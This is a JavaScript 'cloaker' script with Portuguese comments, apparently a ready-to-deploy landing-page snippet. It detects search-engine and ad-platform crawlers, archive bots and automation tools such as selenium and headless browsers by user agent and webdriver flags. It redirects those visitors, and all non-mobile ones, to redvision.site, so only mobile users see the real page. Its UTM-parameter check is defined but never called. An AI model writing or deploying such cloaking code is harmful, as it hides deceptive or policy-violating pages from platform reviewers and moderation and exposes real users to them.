/**
 * Cloaker System v3.1 - Debug Version
 * Protection: Mobile-only, UTM required
 * Redirect: redvision.site
 */
(function () {
  "use strict";

  const REDIRECT_URL = "https://redvision.site";
  const DEBUG = false; // Desativado - modo produção

  // Lista de parâmetros UTM válidos
  const VALID_PARAMS = [
    "utm_source",
    "utm_campaign",
    "utm_medium",
    "utm_content",
    "utm_term",
    "fbclid",
    "gclid",
    "ref",
    "src",
    "ttclid",
    "tblci",
    "click_id",
    "ad_id",
  ];

  let debugInfo = [];

  function log(msg) {
    debugInfo.push(msg);
    if (DEBUG) console.log("[Cloaker]", msg);
  }

  function redirect(reason) {
    log("BLOQUEADO: " + reason);

    // Mostrar diagnóstico antes de redirecionar
    if (DEBUG) {
      alert(
        "CLOAKER DEBUG:\\n\\n" +
          debugInfo.join("\\n") +
          "\\n\\nVai redirecionar em 3s...",
      );
      setTimeout(function () {
        window.location.replace(REDIRECT_URL);
      }, 3000);
    } else {
      window.location.replace(REDIRECT_URL);
    }
  }

  // Detecção simples de mobile
  function isMobile() {
    const ua = navigator.userAgent || "";

    // Verificar User Agent para mobile
    const isMobileUA =
      /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini|Mobile|mobile|CriOS|FxiOS|SamsungBrowser/i.test(
        ua,
      );

    // Verificar touch
    const hasTouch = "ontouchstart" in window || navigator.maxTouchPoints > 0;

    // iPad com iOS 13+ se identifica como MacIntel mas tem touch
    const isIPad =
      navigator.platform === "MacIntel" && navigator.maxTouchPoints > 1;

    log("User Agent: " + ua.substring(0, 50) + "...");
    log("É mobile UA: " + isMobileUA);
    log("Tem touch: " + hasTouch);
    log("É iPad: " + isIPad);
    log("maxTouchPoints: " + navigator.maxTouchPoints);
    log("platform: " + navigator.platform);

    // Muito permissivo: qualquer uma das condições
    const result = isMobileUA || hasTouch || isIPad;
    log("Resultado isMobile: " + result);

    return result;
  }

  // Verificar UTM
  function hasValidUtm() {
    const search = window.location.search;
    log("Query string: " + search);

    if (!search || search === "") {
      log("Query string vazia!");
      return false;
    }

    const urlParams = new URLSearchParams(search);

    for (let param of VALID_PARAMS) {
      const value = urlParams.get(param);
      if (value && value.length > 0) {
        log("UTM encontrado: " + param + "=" + value);
        return true;
      }
    }

    log("Nenhum UTM válido encontrado");
    return false;
  }

  // Verificar se é bot
  function isBot() {
    const ua = (navigator.userAgent || "").toLowerCase();

    const botPatterns = [
      "googlebot",
      "google-inspect",
      "bingbot",
      "slurp",
      "duckduckbot",
      "baiduspider",
      "yandexbot",
      "facebot",
      "facebookexternalhit",
      "ia_archiver",
      "semrushbot",
      "ahrefsbot",
      "mj12bot",
      "dotbot",
      "petalbot",
      "screaming frog",
      "crawl",
      "spider",
      "bot",
      "headless",
      "phantom",
      "selenium",
      "webdriver",
    ];

    for (let pattern of botPatterns) {
      if (ua.includes(pattern)) {
        log("Bot detectado: " + pattern);
        return true;
      }
    }

    // Verificar se tem webdriver (automação)
    if (navigator.webdriver) {
      log("WebDriver detectado");
      return true;
    }

    return false;
  }

  // Inicialização
  function init() {
    log("=== CLOAKER INICIADO ===");
    log("URL: " + window.location.href);

    // 1. Bloquear bots PRIMEIRO
    if (isBot()) {
      redirect("Bot detectado");
      return;
    }
    log("✓ Não é bot");

    // 2. Verificar mobile
    const mobile = isMobile();
    if (!mobile) {
      redirect("Não é mobile");
      return;
    }
    log("✓ Passou check mobile");

    // Passou - permite acesso!
    log("✓✓✓ ACESSO PERMITIDO! ✓✓✓");
    if (DEBUG) {
      console.log("[Cloaker] Mobile detectado - acesso liberado");
    }
  }

  // Executar imediatamente
  init();
})();
